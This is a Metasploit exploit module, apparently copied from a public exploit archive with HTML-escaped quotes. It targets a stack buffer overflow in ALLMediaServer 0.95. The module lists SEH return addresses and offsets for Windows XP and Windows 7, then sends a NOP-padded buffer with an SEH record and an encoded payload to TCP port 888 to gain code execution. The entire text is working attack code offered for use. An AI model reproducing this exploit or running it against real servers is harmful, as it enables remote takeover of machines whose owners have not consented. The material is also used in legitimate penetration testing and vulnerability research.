  
class Metasploit4 < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Seh
  
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;ALLMediaServer 0.95 Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack buffer overflow in ALLMediaServer 0.95.
                The vulnerability is caused due to a boundary error within the
                handling of HTTP request.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Anurag Srivastava&#039;, # Remote exploit and Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;EDB&#039;, &#039;43406&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => &#039;process&#039;, #none/process/thread/seh
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "",
                    &#039;Space&#039; => 660,
                    &#039;DisableNops&#039; => true
                },
  
            &#039;Targets&#039;        =>
                [
                    [ &#039;ALLMediaServer 0.95 / Windows XP SP3 - English&#039;,
                        {
                            &#039;Ret&#039;       =>   0x00408315, # POP # POP # POP # RET 
                            &#039;Offset&#039;    =>   1072
                        }
                    ],
                    [ &#039;ALLMediaServer 0.95 / Windows 7 SP1 - English&#039;,
                        {
                            &#039;Ret&#039;       =>   0x00408315, #  POP # POP # POP # RET 
                            &#039;Offset&#039;    =>   1072
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Dec 28 2017&#039;,
            &#039;DefaultTarget&#039;  => 1))
  
        register_options([Opt::RPORT(888)], self.class)
  
    end
     
    def exploit
        connect
    buffer = ""
        buffer << make_nops(target[&#039;Offset&#039;])
    buffer << generate_seh_record(target.ret)
    buffer << make_nops(19)
        buffer << payload.encoded
        print_status("Sending payload ...")
        sock.put(buffer)
    handler
        disconnect
    end
end

